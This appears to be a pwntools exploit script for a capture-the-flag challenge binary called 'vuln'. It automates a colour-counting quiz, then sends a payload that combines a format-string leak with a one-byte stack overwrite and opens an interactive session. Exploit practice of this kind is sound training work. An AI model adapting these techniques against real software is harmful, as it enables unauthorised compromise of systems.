#!/usr/bin/env python3
from collections import Counter

from pwn import *

exe = context.binary = ELF('vuln')
context.arch = 'amd64'

io = process([exe.path])
io.recvuntil(b")?")
io.sendline(b'y')

io.recvuntil(b"?")
io.recvuntil(b"?")
io.recvline()
io.recvline()

lines = []

while True:
    line = io.recvline()[3:-1]
    if "?" in str(line):
        break
    else:
        lines.append(line.decode("utf-8"))

c = Counter(lines)
io.sendline(str(c["red"]).encode())

io.recvuntil(b"?")
io.sendline(str(c["yellow"]).encode())

io.recvuntil(b"?")
io.sendline(str(c["blue"]).encode())

io.recvuntil(b"name?")
io.sendline(b'')
io.recvuntil(b"else?")

payload = fit({0: b'%25$s', 136: b'\x82'})
io.sendline(payload)
io.interactive()
